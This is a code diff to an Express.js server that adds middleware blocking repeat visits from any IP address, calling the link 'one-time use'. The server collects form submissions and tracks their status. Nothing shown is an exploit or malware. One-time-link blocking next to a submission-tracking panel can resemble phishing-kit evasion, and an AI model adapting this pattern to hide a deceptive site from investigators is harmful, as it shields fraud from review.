@@ -7,7 +7,41 @@ const path = require("path");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 3. Apply middleware
+// --- NEW CODE: IP TRACKING ---
+// Create a Set to store IPs that have visited. A Set is used for fast lookups.
+// IMPORTANT: This list will be cleared every time your server restarts on Render.
+// For a permanent solution, you would need to use a database.
+const visitedIPs = new Set();
+
+// This is our IP blocking middleware. It will run on every request.
+const ipBlocker = (req, res, next) => {
+    // Render and other hosts set req.ip correctly even behind a proxy
+    const userIp = req.ip; 
+
+    // Check if the user's IP is already in our list
+    if (visitedIPs.has(userIp)) {
+        // If it is, send a "Forbidden" status and a message.
+        return res.status(403).send(`
+            <div style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+                <h1>Access Denied</h1>
+                <p>This link was for one-time use and has already been accessed from this network.</p>
+            </div>
+        `);
+    }
+
+    // If it's a new IP, add it to the list for future checks
+    visitedIPs.add(userIp);
+
+    // Continue to the next step (serving the website)
+    next();
+};
+
+// Apply the IP blocker middleware to ALL incoming requests
+app.use(ipBlocker);
+// --- END OF NEW CODE ---
+
+
+// 3. Apply other middleware
 app.use(cors());
 app.use(express.json());
 
@@ -16,21 +50,21 @@ app.use(express.static(path.join(__dirname)));
 
 // This tells the server that when someone visits the main address ('/'),
 // it should send them the 'tariffs.html' file.
-// NOTE: I noticed your main file is now 'tariffs.html'. If it should be 'index.html',
-// you can change it back here.
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, "tariffs.html"));
 });
 
 // 5. Create an "in-memory" database that holds a LIST of submissions
-// IMPORTANT: This data will be lost if the server restarts on the hosting service.
 let submissions = [];
+
+// ... (The rest of your endpoints: /submit, /submission, /update-status, etc.)
+// No changes are needed to your existing endpoints.
 
 // 6. Endpoint for receiving user data
 app.post("/submit", (req, res) => {
     console.log("Received a new submission!");
     const newSubmission = req.body;
-    newSubmission.id = Date.now().toString(); // Simple unique ID
+    newSubmission.id = Date.now().toString(); 
     newSubmission.status = "pending";
     newSubmission.timestamp = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
     submissions.push(newSubmission);
@@ -89,6 +123,7 @@ app.get("/archive", (req, res) => {
         .reverse();
     res.status(200).json(archivedSubmissions);
 });
+
 
 // 11. Start the server
 app.listen(PORT, () => {
